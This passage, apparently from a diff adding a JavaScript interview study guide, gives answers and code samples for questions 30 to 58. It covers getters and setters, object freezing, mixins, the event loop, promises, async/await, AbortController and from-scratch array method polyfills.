+Under the hood, all three produce the same prototype chain. `class` is syntactic sugar — it compiles to constructor functions and prototype assignments.
+
+---
+
+## Q30. What are getters and setters in JavaScript?
+
+**Answer:**
+
+Getters and setters are special methods that allow you to define **computed properties** or **intercept** property access and assignment. They look like properties but work like functions.
+
+```js
+class Temperature {
+  constructor(celsius) {
+    this._celsius = celsius; // convention: _ prefix for "private"
+  }
+
+  get fahrenheit() {
+    return this._celsius * 9/5 + 32; // computed on access
+  }
+
+  set fahrenheit(value) {
+    this._celsius = (value - 32) * 5/9; // validate/transform on set
+  }
+
+  get celsius() {
+    return this._celsius;
+  }
+
+  set celsius(value) {
+    if (value < -273.15) throw new Error("Temperature below absolute zero!");
+    this._celsius = value;
+  }
+}
+
+const temp = new Temperature(0);
+console.log(temp.fahrenheit); // 32 — looks like property access, runs getter
+temp.fahrenheit = 212;        // looks like assignment, runs setter
+console.log(temp.celsius);    // 100
+```
+
+**With plain objects:**
+```js
+const user = {
+  _firstName: "Ravi",
+  _lastName: "Kumar",
+  get fullName() {
+    return `${this._firstName} ${this._lastName}`;
+  },
+  set fullName(name) {
+    [this._firstName, this._lastName] = name.split(" ");
+  }
+};
+
+console.log(user.fullName);   // "Ravi Kumar"
+user.fullName = "Priya Sharma";
+console.log(user._firstName); // "Priya"
+```
+
+---
+
+## Q31. What is `Object.freeze()` vs `Object.seal()`?
+
+**Answer:**
+
+Both methods restrict how an object can be modified, but at different levels:
+
+```js
+// Object.freeze() — fully immutable
+const config = Object.freeze({
+  apiUrl: "https://api.example.com",
+  timeout: 5000
+});
+
+config.apiUrl = "https://other.com"; // silently fails (throws in strict mode)
+config.newProp = "test";             // silently fails
+delete config.timeout;               // silently fails
+console.log(config.apiUrl); // "https://api.example.com" — unchanged
+
+// Object.seal() — can modify existing properties, but can't add/delete
+const user = Object.seal({
+  name: "Ravi",
+  age: 25
+});
+
+user.name = "Priya"; // ALLOWED — modifying existing property
+user.email = "test"; // fails — can't add new property
+delete user.age;     // fails — can't delete
+console.log(user.name); // "Priya"
+```
+
+**Important — `freeze` is shallow!**
+```js
+const obj = Object.freeze({
+  nested: { value: 42 } // nested object is NOT frozen!
+});
+obj.nested.value = 100; // This WORKS! — only top-level is frozen
+console.log(obj.nested.value); // 100
+```
+
+For deep freezing, you need a recursive function.
+
+---
+
+## Q32. Explain Mixins in JavaScript.
+
+**Answer:**
+
+A mixin is a pattern for **combining behaviors from multiple sources** into a single object or class, since JavaScript doesn't support multiple inheritance.
+
+```js
+// Define behavior mixins:
+const Serializable = {
+  serialize() {
+    return JSON.stringify(this);
+  },
+  deserialize(json) {
+    return Object.assign(this, JSON.parse(json));
+  }
+};
+
+const Validatable = {
+  validate() {
+    return Object.values(this).every(v => v !== null && v !== undefined);
+  }
+};
+
+// Apply mixins to a class:
+class User {
+  constructor(name, email) {
+    this.name = name;
+    this.email = email;
+  }
+}
+
+// Mix in the behaviors:
+Object.assign(User.prototype, Serializable, Validatable);
+
+const user = new User("Ravi", "ravi@example.com");
+console.log(user.validate());  // true
+console.log(user.serialize()); // '{"name":"Ravi","email":"ravi@example.com"}'
+```
+
+---
+
+## Q33. What is the difference between `instanceof` and `typeof`?
+
+**Answer:**
+
+```js
+// typeof — checks primitive type (returns a string)
+typeof "hello"   // "string"
+typeof 42        // "number"
+typeof {}        // "object"
+typeof []        // "object" — not helpful for arrays
+typeof null      // "object" — bug
+typeof function(){} // "function"
+
+// instanceof — checks prototype chain (returns boolean)
+[] instanceof Array;   // true
+[] instanceof Object;  // true — Array.prototype inherits from Object.prototype
+{} instanceof Object;  // true
+
+function Car() {}
+const c = new Car();
+c instanceof Car;    // true
+c instanceof Object; // true
+
+// instanceof with primitives — doesn't work as expected:
+"hello" instanceof String; // false — "hello" is a primitive, not an object
+new String("hello") instanceof String; // true — String object
+```
+
+**Custom `instanceof` check:**
+```js
+// Checking across iframes or different execution contexts can fail
+// because each frame has its own Array constructor
+// Solution: use Array.isArray() for arrays, which works across frames
+Array.isArray([]); // true — always reliable
+```
+
+---
+
+---
+
+# 4. Async JavaScript & Event Loop
+
+---
+
+## Q34. Explain the JavaScript Event Loop in depth.
+
+**Answer:**
+
+JavaScript is **single-threaded** — it can only execute one thing at a time. But it handles asynchronous operations without blocking through the **Event Loop**.
+
+**The components:**
+
+1. **Call Stack** — where JS executes code, one function at a time (LIFO)
+2. **Web APIs / Node APIs** — browser-provided timers, DOM events, HTTP requests
+3. **Callback Queue (Macrotask Queue)** — callbacks from `setTimeout`, `setInterval`, I/O
+4. **Microtask Queue** — callbacks from `Promise.then`, `queueMicrotask`, `MutationObserver`
+5. **Event Loop** — the orchestrator: when the call stack is empty, it checks the microtask queue first, then the callback queue
+
+```js
+console.log("1 - Start");              // ① Call Stack: executes immediately
+
+setTimeout(() => {
+  console.log("2 - setTimeout");       // ④ Macrotask Queue
+}, 0);
+
+Promise.resolve()
+  .then(() => console.log("3 - Promise 1")) // ③ Microtask Queue
+  .then(() => console.log("4 - Promise 2")); // ③ Microtask Queue
+
+console.log("5 - End");               // ② Call Stack: executes immediately
+
+// Output order: 1, 5, 3, 4, 2
+// Reason: Call stack (1, 5) → All microtasks (3, 4) → Macrotasks (2)
+```
+
+**Key rule: Microtasks ALWAYS run before Macrotasks, and ALL microtasks run before the next macrotask.**
+
+---
+
+## Q35. What is the difference between Microtasks and Macrotasks?
+
+**Answer:**
+
+**Macrotasks (Task Queue):**
+- `setTimeout`, `setInterval`, `setImmediate` (Node.js)
+- I/O operations, UI rendering
+- Only one macrotask runs per event loop tick
+
+**Microtasks (Microtask Queue):**
+- `Promise.then()`, `Promise.catch()`, `Promise.finally()`
+- `queueMicrotask()`
+- `MutationObserver`
+- ALL microtasks in the queue run before the next macrotask
+
+```js
+// Tricky example:
+setTimeout(() => console.log("timeout 1"), 0);  // macrotask
+
+Promise.resolve()
+  .then(() => {
+    console.log("promise 1");
+    // adding another microtask from within a microtask:
+    return Promise.resolve();
+  })
+  .then(() => console.log("promise 2")); // still runs before timeout!
+
+setTimeout(() => console.log("timeout 2"), 0);  // macrotask
+
+// Output: promise 1, promise 2, timeout 1, timeout 2
+// All microtasks drain completely before any macrotask runs
+```
+
+---
+
+## Q36. What are Promises? Explain states and chaining.
+
+**Answer:**
+
+A Promise is an object representing the eventual completion or failure of an asynchronous operation. A Promise is always in one of three states:
+
+- **Pending** — initial state, operation not yet complete
+- **Fulfilled** — operation completed successfully, has a value
+- **Rejected** — operation failed, has a reason (error)
+
+Once settled (fulfilled or rejected), a Promise **cannot change state**.
+
+```js
+// Creating a Promise:
+const fetchUser = (id) => new Promise((resolve, reject) => {
+  // Simulating async operation
+  setTimeout(() => {
+    if (id === 1) {
+      resolve({ id: 1, name: "Ravi" }); // fulfilled with a value
+    } else {
+      reject(new Error("User not found")); // rejected with an error
+    }
+  }, 1000);
+});
+
+// Consuming with .then()/.catch()/.finally():
+fetchUser(1)
+  .then(user => {
+    console.log(user.name); // "Ravi"
+    return user.id * 100;   // you can return values to chain
+  })
+  .then(value => {
+    console.log(value); // 100 — chained from previous .then()
+  })
+  .catch(err => {
+    console.error(err.message); // handles any rejection in the chain
+  })
+  .finally(() => {
+    console.log("Always runs"); // cleanup — regardless of success or failure
+  });
+```
+
+**Promise chaining — each `.then()` returns a NEW promise:**
+```js
+// Anti-pattern — Promise Hell (don't do this):
+fetchUser(1).then(user => {
+  fetchPosts(user.id).then(posts => {
+    fetchComments(posts[0].id).then(comments => {
+      // deeply nested — hard to read and error handle
+    });
+  });
+});
+
+// Correct — flat chaining:
+fetchUser(1)
+  .then(user => fetchPosts(user.id))
+  .then(posts => fetchComments(posts[0].id))
+  .then(comments => console.log(comments))
+  .catch(err => console.error(err)); // single catch for all errors
+```
+
+---
+
+## Q37. Explain `async`/`await` in depth. How does it work under the hood?
+
+**Answer:**
+
+`async`/`await` is syntactic sugar over Promises. It makes asynchronous code look and read like synchronous code, improving readability without changing the underlying mechanism.
+
+```js
+// With Promises:
+function fetchUserData(id) {
+  return fetchUser(id)
+    .then(user => fetchPosts(user.id))
+    .then(posts => fetchComments(posts[0].id));
+}
+
+// With async/await — much cleaner:
+async function fetchUserData(id) {
+  const user = await fetchUser(id);         // pauses here until resolved
+  const posts = await fetchPosts(user.id);  // then pauses here
+  const comments = await fetchComments(posts[0].id);
+  return comments;
+}
+```
+
+**Under the hood:** An `async` function always returns a Promise. The `await` keyword **pauses execution of the async function** and yields control back to the event loop until the awaited Promise settles. Other code CAN run while the async function is paused.
+
+**Error handling with async/await:**
+```js
+async function loadData() {
+  try {
+    const user = await fetchUser(1);
+    const posts = await fetchPosts(user.id);
+    return posts;
+  } catch (err) {
+    console.error("Failed:", err.message);
+    throw err; // re-throw if you want the caller to handle it too
+  } finally {
+    console.log("Cleanup");
+  }
+}
+```
+
+**Sequential vs Parallel:**
+```js
+// Sequential — each waits for the previous (slow if independent):
+async function sequential() {
+  const user = await fetchUser(1);     // waits ~1s
+  const posts = await fetchPosts(1);   // waits another ~1s
+  // Total: ~2s
+}
+
+// Parallel — fire all at once (fast):
+async function parallel() {
+  const [user, posts] = await Promise.all([
+    fetchUser(1),
+    fetchPosts(1)
+  ]);
+  // Total: ~1s (both run simultaneously)
+}
+```
+
+---
+
+## Q38. Implement `Promise.all`, `Promise.race`, `Promise.allSettled`, `Promise.any` from scratch.
+
+**Answer:**
+
+**`Promise.all` — rejects if ANY promise rejects:**
+```js
+function myPromiseAll(promises) {
+  return new Promise((resolve, reject) => {
+    if (promises.length === 0) return resolve([]);
+
+    const results = new Array(promises.length);
+    let resolvedCount = 0;
+
+    promises.forEach((promise, index) => {
+      Promise.resolve(promise) // handle non-promise values too
+        .then(value => {
+          results[index] = value; // maintain order with index
+          resolvedCount++;
+          if (resolvedCount === promises.length) {
+            resolve(results); // resolve only when ALL are done
+          }
+        })
+        .catch(reject); // reject immediately on first failure
+    });
+  });
+}
+```
+
+**`Promise.race` — settles with the FIRST promise that settles:**
+```js
+function myPromiseRace(promises) {
+  return new Promise((resolve, reject) => {
+    promises.forEach(promise => {
+      Promise.resolve(promise).then(resolve).catch(reject);
+      // first one to settle (resolve or reject) wins
+    });
+  });
+}
+```
+
+**`Promise.allSettled` — waits for ALL, never rejects:**
+```js
+function myPromiseAllSettled(promises) {
+  return Promise.all(
+    promises.map(p =>
+      Promise.resolve(p)
+        .then(value => ({ status: "fulfilled", value }))
+        .catch(reason => ({ status: "rejected", reason }))
+      // each promise is wrapped to always fulfill with a status object
+    )
+  );
+}
+```
+
+**`Promise.any` — resolves with first SUCCESS, rejects if ALL fail:**
+```js
+function myPromiseAny(promises) {
+  return new Promise((resolve, reject) => {
+    let rejectedCount = 0;
+    const errors = new Array(promises.length);
+
+    promises.forEach((promise, index) => {
+      Promise.resolve(promise)
+        .then(resolve) // first success wins
+        .catch(err => {
+          errors[index] = err;
+          rejectedCount++;
+          if (rejectedCount === promises.length) {
+            reject(new AggregateError(errors, "All promises were rejected"));
+          }
+        });
+    });
+  });
+}
+```
+
+---
+
+## Q39. What is `Promise.all` vs `Promise.allSettled`? When to use which?
+
+**Answer:**
+
+```js
+const p1 = Promise.resolve("success 1");
+const p2 = Promise.reject(new Error("failed"));
+const p3 = Promise.resolve("success 3");
+
+// Promise.all — short-circuits on first rejection:
+Promise.all([p1, p2, p3])
+  .then(results => console.log(results)) // never runs
+  .catch(err => console.log(err.message)); // "failed" — aborts early
+
+// Promise.allSettled — waits for all, never rejects:
+Promise.allSettled([p1, p2, p3])
+  .then(results => {
+    results.forEach(r => {
+      if (r.status === "fulfilled") console.log("OK:", r.value);
+      else console.log("Error:", r.reason.message);
+    });
+    // OK: success 1
+    // Error: failed
+    // OK: success 3
+  });
+```
+
+**When to use `Promise.all`:** When you need ALL operations to succeed, and a single failure makes the whole operation meaningless. Example: loading all required data before rendering a page.
+
+**When to use `Promise.allSettled`:** When you want to know the outcome of ALL operations regardless of individual failures. Example: sending notifications to multiple users — you want to know which succeeded and which failed, but one failure shouldn't prevent others.
+
+---
+
+## Q40. Implement a retry mechanism with exponential backoff.
+
+**Answer:**
+
+```js
+async function retryWithBackoff(fn, options = {}) {
+  const {
+    maxRetries = 3,
+    baseDelay = 1000,  // 1 second
+    maxDelay = 30000,  // 30 seconds cap
+    factor = 2         // exponential factor
+  } = options;
+
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
+    try {
+      return await fn();
+    } catch (err) {
+      if (attempt === maxRetries) {
+        throw err; // all retries exhausted
+      }
+
+      // Exponential backoff: 1s, 2s, 4s, 8s...
+      // With jitter to avoid thundering herd problem
+      const delay = Math.min(
+        baseDelay * Math.pow(factor, attempt) + Math.random() * 100,
+        maxDelay
+      );
+
+      console.log(`Attempt ${attempt + 1} failed. Retrying in ${delay}ms...`);
+      await new Promise(resolve => setTimeout(resolve, delay));
+    }
+  }
+}
+
+// Usage:
+const result = await retryWithBackoff(
+  () => fetch("https://api.example.com/data").then(r => r.json()),
+  { maxRetries: 3, baseDelay: 500 }
+);
+```
+
+---
+
+## Q41. What is `async`/`await` error handling best practices?
+
+**Answer:**
+
+```js
+// Pattern 1: try/catch — straightforward
+async function fetchData() {
+  try {
+    const response = await fetch("/api/data");
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    return await response.json();
+  } catch (err) {
+    console.error("Failed to fetch:", err);
+    return null; // graceful fallback
+  }
+}
+
+// Pattern 2: Helper function — avoid try/catch repetition (Go-style)
+async function to(promise) {
+  try {
+    const data = await promise;
+    return [null, data];
+  } catch (err) {
+    return [err, null];
+  }
+}
+
+// Usage:
+const [err, user] = await to(fetchUser(1));
+if (err) { /* handle error */ }
+else { /* use user */ }
+
+// Pattern 3: Catch at the call site:
+const data = await fetchData().catch(err => {
+  // handle or return default
+  return [];
+});
+```
+
+---
+
+## Q42. What are Generator Functions and how do they relate to async/await?
+
+**Answer:**
+
+Generator functions can **pause and resume** their execution using the `yield` keyword. They return an iterator object.
+
+```js
+function* numberGenerator() {
+  yield 1;  // pause here, return 1
+  yield 2;  // pause here, return 2
+  yield 3;  // pause here, return 3
+}
+
+const gen = numberGenerator();
+console.log(gen.next()); // { value: 1, done: false }
+console.log(gen.next()); // { value: 2, done: false }
+console.log(gen.next()); // { value: 3, done: false }
+console.log(gen.next()); // { value: undefined, done: true }
+
+// Generators are iterable:
+for (const num of numberGenerator()) {
+  console.log(num); // 1, 2, 3
+}
+```
+
+**Generators as lazy infinite sequences:**
+```js
+function* fibonacci() {
+  let a = 0, b = 1;
+  while (true) {
+    yield a;
+    [a, b] = [b, a + b];
+  }
+}
+
+const fib = fibonacci();
+// Take first 8:
+Array.from({ length: 8 }, () => fib.next().value);
+// [0, 1, 1, 2, 3, 5, 8, 13]
+```
+
+**Relation to async/await:** `async`/`await` is built on generators + Promises internally. Before async/await (ES2017), libraries like `co` used generators to achieve the same effect:
+
+```js
+// async/await (ES2017):
+async function fetchAndProcess() {
+  const data = await fetchData();
+  const result = await process(data);
+  return result;
+}
+
+// Generator equivalent (conceptually):
+function* fetchAndProcessGen() {
+  const data = yield fetchData(); // pause, wait for Promise
+  const result = yield process(data); // pause, wait for Promise
+  return result;
+}
+// (requires a runner to handle the yielded Promises)
+```
+
+---
+
+## Q43. What is `setTimeout` vs `setInterval` vs `requestAnimationFrame`?
+
+**Answer:**
+
+```js
+// setTimeout — run ONCE after a delay
+const id = setTimeout(() => {
+  console.log("Runs once after 2 seconds");
+}, 2000);
+clearTimeout(id); // cancel before it runs
+
+// setInterval — run REPEATEDLY at intervals
+const intervalId = setInterval(() => {
+  console.log("Runs every 1 second");
+}, 1000);
+clearInterval(intervalId); // stop it
+
+// Recursive setTimeout — more reliable than setInterval:
+// setInterval doesn't wait for the callback to finish before scheduling the next one
+// Recursive setTimeout fires the next call only after the current one finishes:
+function poll() {
+  setTimeout(async () => {
+    await doSomething(); // waits for this to finish
+    poll(); // then schedule the next one
+  }, 1000);
+}
+
+// requestAnimationFrame — for smooth animations, synced to display refresh
+function animate() {
+  updatePosition();
+  requestAnimationFrame(animate); // called ~60 times/sec (synced to monitor)
+}
+requestAnimationFrame(animate);
+```
+
+**Important:** `setTimeout(fn, 0)` doesn't run immediately — it schedules after the current call stack and all microtasks complete. It's the minimum delay, but not guaranteed.
+
+---
+
+## Q44. Explain `Promise` chaining vs `async/await` for complex flows.
+
+**Answer:**
+
+```js
+// Scenario: fetch user → fetch their orders → fetch order details
+
+// Promise chaining — can get messy but powerful:
+function loadOrderDetails(userId) {
+  return fetchUser(userId)
+    .then(user => {
+      if (!user) throw new Error("No user");
+      return fetchOrders(user.id);
+    })
+    .then(orders => {
+      if (orders.length === 0) return [];
+      return Promise.all(orders.map(o => fetchOrderDetail(o.id)));
+    })
+    .catch(err => {
+      console.error(err);
+      return [];
+    });
+}
+
+// async/await — cleaner, easier to add conditions/loops:
+async function loadOrderDetails(userId) {
+  try {
+    const user = await fetchUser(userId);
+    if (!user) throw new Error("No user");
+
+    const orders = await fetchOrders(user.id);
+    if (orders.length === 0) return [];
+
+    // Parallel fetch of all order details:
+    return await Promise.all(orders.map(o => fetchOrderDetail(o.id)));
+  } catch (err) {
+    console.error(err);
+    return [];
+  }
+}
+```
+
+---
+
+## Q45. What is the difference between `Promise.resolve()` and `new Promise(resolve => resolve())`?
+
+**Answer:**
+
+Both produce a resolved Promise, but there's a subtle difference in timing:
+
+```js
+// Promise.resolve(value) — creates an already-resolved Promise
+// If value is already a thenable (Promise-like), it returns it as-is (or wraps it)
+Promise.resolve(42); // immediately resolved with 42
+Promise.resolve(anotherPromise); // returns anotherPromise (if it's a native Promise)
+
+// new Promise(resolve => resolve(value)) — always creates a NEW Promise
+// Even if you pass a Promise to resolve(), it creates a wrapper
+const p = Promise.resolve(42);
+new Promise(resolve => resolve(p)); // one extra microtask tick to unwrap p!
+
+// Practical implication:
+Promise.resolve(somePromise).then(v => console.log(v)); // fewer microtask ticks
+new Promise(r => r(somePromise)).then(v => console.log(v)); // one extra tick
+```
+
+This difference matters in performance-sensitive code or when microtask ordering is critical.
+
+---
+
+## Q46. Implement a simple Promise from scratch.
+
+**Answer:**
+
+```js
+class MyPromise {
+  #state = "pending";
+  #value = undefined;
+  #handlers = [];
+
+  constructor(executor) {
+    const resolve = (value) => {
+      if (this.#state !== "pending") return;
+      this.#state = "fulfilled";
+      this.#value = value;
+      this.#handlers.forEach(h => h.onFulfilled && h.onFulfilled(value));
+    };
+
+    const reject = (reason) => {
+      if (this.#state !== "pending") return;
+      this.#state = "rejected";
+      this.#value = reason;
+      this.#handlers.forEach(h => h.onRejected && h.onRejected(reason));
+    };
+
+    try {
+      executor(resolve, reject);
+    } catch (err) {
+      reject(err);
+    }
+  }
+
+  then(onFulfilled, onRejected) {
+    return new MyPromise((resolve, reject) => {
+      const handle = (handler, value, resolver) => {
+        try {
+          if (typeof handler === "function") {
+            const result = handler(value);
+            resolve(result);
+          } else {
+            resolver(value); // pass through if no handler
+          }
+        } catch (err) {
+          reject(err);
+        }
+      };
+
+      if (this.#state === "fulfilled") {
+        queueMicrotask(() => handle(onFulfilled, this.#value, resolve));
+      } else if (this.#state === "rejected") {
+        queueMicrotask(() => handle(onRejected, this.#value, reject));
+      } else {
+        this.#handlers.push({
+          onFulfilled: v => queueMicrotask(() => handle(onFulfilled, v, resolve)),
+          onRejected: r => queueMicrotask(() => handle(onRejected, r, reject))
+        });
+      }
+    });
+  }
+
+  catch(onRejected) {
+    return this.then(undefined, onRejected);
+  }
+
+  finally(onFinally) {
+    return this.then(
+      value => { onFinally(); return value; },
+      reason => { onFinally(); throw reason; }
+    );
+  }
+}
+```
+
+---
+
+## Q47. What is `AbortController` and when do you use it?
+
+**Answer:**
+
+`AbortController` lets you cancel ongoing async operations like `fetch` requests. This is crucial for preventing race conditions and memory leaks, especially in React when a component unmounts before a fetch completes.
+
+```js
+const controller = new AbortController();
+const signal = controller.signal;
+
+// Start a fetch with the abort signal:
+fetch("https://api.example.com/data", { signal })
+  .then(res => res.json())
+  .then(data => console.log(data))
+  .catch(err => {
+    if (err.name === "AbortError") {
+      console.log("Fetch was cancelled"); // handle cancellation
+    } else {
+      console.error("Fetch failed:", err);
+    }
+  });
+
+// Cancel the request:
+controller.abort();
+
+// React example — cancel on unmount:
+useEffect(() => {
+  const controller = new AbortController();
+
+  fetch("/api/users", { signal: controller.signal })
+    .then(r => r.json())
+    .then(setUsers)
+    .catch(err => {
+      if (err.name !== "AbortError") setError(err);
+    });
+
+  return () => controller.abort(); // cleanup when component unmounts
+}, []);
+```
+
+---
+
+## Q48. Predict the output — Event Loop Advanced
+
+**Answer:**
+
+```js
+// Question 1:
+async function foo() {
+  console.log("A");
+  await Promise.resolve();
+  console.log("B");
+}
+
+console.log("C");
+foo();
+console.log("D");
+
+// Output: C, A, D, B
+// Reason: C (sync), foo starts → A (sync in foo), await yields → D (sync), then B (microtask)
+
+// Question 2:
+Promise.resolve()
+  .then(() => console.log(1))
+  .then(() => console.log(2));
+
+Promise.resolve()
+  .then(() => console.log(3))
+  .then(() => console.log(4));
+
+// Output: 1, 3, 2, 4
+// Reason: Both first .then()s are queued first (1, 3), then both second .then()s (2, 4)
+// They interleave because each .then() adds the NEXT handler only after it runs
+
+// Question 3:
+setTimeout(() => console.log("timeout"), 0);
+queueMicrotask(() => console.log("microtask"));
+Promise.resolve().then(() => console.log("promise"));
+
+// Output: microtask, promise, timeout
+// Both microtask and promise are in microtask queue, timeout in macrotask queue
+```
+
+---
+
+## Q49. What is a race condition? How do you prevent it in async code?
+
+**Answer:**
+
+A race condition occurs when the outcome depends on the timing of multiple async operations — specifically, when results arrive in a different order than expected.
+
+```js
+// Race condition example:
+let currentUser = null;
+
+async function searchUser(query) {
+  const user = await fetchUser(query); // might take variable time
+  currentUser = user; // ❌ if two searches run, the slower one might overwrite the faster one!
+  renderUser(currentUser);
+}
+
+// User types "Ra" → fetches → takes 300ms
+// User types "Ravi" → fetches → takes 100ms (finishes first)
+// "Ra" result arrives → overwrites "Ravi" result! Wrong!
+
+// Fix 1: Cancel previous request with AbortController:
+let currentController = null;
+
+async function searchUser(query) {
+  if (currentController) currentController.abort(); // cancel previous
+  currentController = new AbortController();
+
+  try {
+    const user = await fetchUser(query, { signal: currentController.signal });
+    currentUser = user; // ✅ only latest request reaches here
+    renderUser(user);
+  } catch (err) {
+    if (err.name !== "AbortError") throw err;
+  }
+}
+
+// Fix 2: Check if request is still "current" using a token:
+let requestId = 0;
+
+async function searchUser(query) {
+  const myId = ++requestId; // unique ID for this request
+  const user = await fetchUser(query);
+  if (myId !== requestId) return; // a newer request has been made, discard this result
+  currentUser = user;
+  renderUser(user);
+}
+```
+
+---
+
+## Q50. What is `queueMicrotask()` and when would you use it?
+
+**Answer:**
+
+`queueMicrotask()` schedules a function to run as a **microtask** — after the current task but before any macrotasks, and it integrates with the microtask queue alongside Promise callbacks.
+
+```js
+// Scheduling without Promises:
+queueMicrotask(() => {
+  console.log("This runs as a microtask");
+});
+
+// Comparison:
+console.log("1");
+queueMicrotask(() => console.log("2 - microtask"));
+setTimeout(() => console.log("3 - macrotask"), 0);
+console.log("4");
+// Output: 1, 4, 2, 3
+```
+
+**Use case — batching DOM updates:**
+```js
+let updatePending = false;
+const updates = [];
+
+function scheduleUpdate(data) {
+  updates.push(data);
+
+  if (!updatePending) {
+    updatePending = true;
+    queueMicrotask(() => {
+      // batch process all updates that accumulated synchronously
+      processAllUpdates(updates);
+      updates.length = 0;
+      updatePending = false;
+    });
+  }
+}
+```
+
+---
+
+---
+
+# 5. Array & Object Methods / Polyfills
+
+---
+
+## Q51. Implement `Array.prototype.map` from scratch.
+
+**Answer:**
+
+```js
+Array.prototype.myMap = function(callback, thisArg) {
+  if (typeof callback !== "function") {
+    throw new TypeError(callback + " is not a function");
+  }
+
+  const result = new Array(this.length);
+
+  for (let i = 0; i < this.length; i++) {
+    // Only process indices that exist (handles sparse arrays)
+    if (i in this) {
+      // callback receives: currentValue, index, original array
+      result[i] = callback.call(thisArg, this[i], i, this);
+    }
+  }
+
+  return result;
+};
+
+// Test:
+[1, 2, 3].myMap(x => x * 2); // [2, 4, 6]
+[1, 2, 3].myMap((val, idx) => `${idx}:${val}`); // ["0:1", "1:2", "2:3"]
+```
+
+---
+
+## Q52. Implement `Array.prototype.filter` and `Array.prototype.reduce` from scratch.
+
+**Answer:**
+
+```js
+// filter — returns new array with elements that pass the test
+Array.prototype.myFilter = function(callback, thisArg) {
+  const result = [];
+  for (let i = 0; i < this.length; i++) {
+    if (i in this && callback.call(thisArg, this[i], i, this)) {
+      result.push(this[i]);
+    }
+  }
+  return result;
+};
+
+// reduce — folds array into a single value
+Array.prototype.myReduce = function(callback, initialValue) {
+  if (this.length === 0 && initialValue === undefined) {
+    throw new TypeError("Reduce of empty array with no initial value");
+  }
+
+  let accumulator = initialValue !== undefined ? initialValue : this[0];
+  let startIndex = initialValue !== undefined ? 0 : 1;
+
+  for (let i = startIndex; i < this.length; i++) {
+    if (i in this) {
+      // accumulator, currentValue, index, array
+      accumulator = callback(accumulator, this[i], i, this);
+    }
+  }
+
+  return accumulator;
+};
+
+// Tests:
+[1,2,3,4].myFilter(x => x % 2 === 0); // [2, 4]
+[1,2,3,4].myReduce((sum, x) => sum + x, 0); // 10
+```
+
+---
+
+## Q53. Implement `Array.prototype.flat` from scratch.
+
+**Answer:**
+
+```js
+Array.prototype.myFlat = function(depth = 1) {
+  const result = [];
+
+  function flatten(arr, currentDepth) {
+    for (const item of arr) {
+      if (Array.isArray(item) && currentDepth > 0) {
+        flatten(item, currentDepth - 1); // recurse with reduced depth
+      } else {
+        result.push(item);
+      }
+    }
+  }
+
+  flatten(this, depth);
+  return result;
+};
+
+// Tests:
+[1, [2, [3, [4]]]].myFlat();        // [1, 2, [3, [4]]] — depth 1
+[1, [2, [3, [4]]]].myFlat(2);       // [1, 2, 3, [4]]
+[1, [2, [3, [4]]]].myFlat(Infinity); // [1, 2, 3, 4]
+```
+
+---
+
+## Q54. Implement `flatMap` from scratch.
+
+**Answer:**
+
+`flatMap` is equivalent to calling `.map()` then `.flat(1)`, but more efficient:
+
+```js
+Array.prototype.myFlatMap = function(callback, thisArg) {
+  return this.myMap(callback, thisArg).myFlat(1);
+};
+
+// Use cases:
+const sentences = ["Hello World", "How are you"];
+sentences.flatMap(s => s.split(" ")); // ["Hello", "World", "How", "are", "you"]
+
+// Filtering while mapping (return empty array to skip):
+[1, 2, 3, 4].flatMap(x => x % 2 === 0 ? [x, x * 10] : []);
+// [2, 20, 4, 40]
+```
+
+---
+
+## Q55. Deep clone an object without JSON methods.
+
+**Answer:**
+
+`JSON.parse(JSON.stringify(obj))` has several limitations: it loses `undefined`, functions, `Symbol` keys, `Date` objects (converts to strings), and circular references crash it.
+
+```js
+function deepClone(value, visited = new WeakMap()) {
+  // Handle primitives and null
+  if (value === null || typeof value !== "object") return value;
+
+  // Handle circular references
+  if (visited.has(value)) return visited.get(value);
+
+  // Handle special types:
+  if (value instanceof Date) return new Date(value.getTime());
+  if (value instanceof RegExp) return new RegExp(value.source, value.flags);
+  if (value instanceof Map) {
+    const clonedMap = new Map();
+    visited.set(value, clonedMap);
+    value.forEach((v, k) => clonedMap.set(deepClone(k, visited), deepClone(v, visited)));
+    return clonedMap;
+  }
+  if (value instanceof Set) {
+    const clonedSet = new Set();
+    visited.set(value, clonedSet);
+    value.forEach(v => clonedSet.add(deepClone(v, visited)));
+    return clonedSet;
+  }
+
+  // Handle arrays and plain objects:
+  const clone = Array.isArray(value) ? [] : {};
+  visited.set(value, clone); // register before recursing to handle circular refs
+
+  for (const key of [...Object.keys(value), ...Object.getOwnPropertySymbols(value)]) {
+    clone[key] = deepClone(value[key], visited);
+  }
+
+  return clone;
+}
+```
+
+---
+
+## Q56. Flatten a deeply nested object.
+
+**Answer:**
+
+```js
+function flattenObject(obj, prefix = "", result = {}) {
+  for (const key in obj) {
+    if (!obj.hasOwnProperty(key)) continue;
+
+    const fullKey = prefix ? `${prefix}.${key}` : key;
+
+    if (
+      typeof obj[key] === "object" &&
+      obj[key] !== null &&
+      !Array.isArray(obj[key]) &&
+      !(obj[key] instanceof Date)
+    ) {
+      flattenObject(obj[key], fullKey, result); // recurse for nested objects
+    } else {
+      result[fullKey] = obj[key]; // base case
+    }
+  }
+  return result;
+}
+
+// Input:
+const nested = {
+  user: {
+    name: "Ravi",
+    address: {
+      city: "Bangalore",
+      pin: 560001
+    }
+  },
+  active: true
+};
+
+flattenObject(nested);
+// Output:
+// {
+//   "user.name": "Ravi",
+//   "user.address.city": "Bangalore",
+//   "user.address.pin": 560001,
+//   "active": true
+// }
+```
+
+---
+
+## Q57. Implement `groupBy` for arrays.
+
+**Answer:**
+
+```js
+// Using reduce:
+function groupBy(arr, keyFn) {
+  return arr.reduce((groups, item) => {
+    const key = typeof keyFn === "function" ? keyFn(item) : item[keyFn];
+    if (!groups[key]) groups[key] = [];
+    groups[key].push(item);
+    return groups;
+  }, {});
+}
+
+const employees = [
+  { name: "Ravi", dept: "Engineering" },
+  { name: "Priya", dept: "Design" },
+  { name: "Kiran", dept: "Engineering" },
+  { name: "Meera", dept: "Design" },
+];
+
+groupBy(employees, "dept");
+// {
+//   Engineering: [{ name: "Ravi"... }, { name: "Kiran"... }],
+//   Design: [{ name: "Priya"... }, { name: "Meera"... }]
+// }
+
+// Group by custom function:
+const numbers = [1, 2, 3, 4, 5, 6];
+groupBy(numbers, n => n % 2 === 0 ? "even" : "odd");
+// { odd: [1, 3, 5], even: [2, 4, 6] }
+
+// Note: Object.groupBy() is now a native JS method (ES2024)
+```
+
+---
+
+## Q58. Implement `chunk` — split array into subarrays of given size.
+
+**Answer:**
+
+```js
+function chunk(arr, size) {
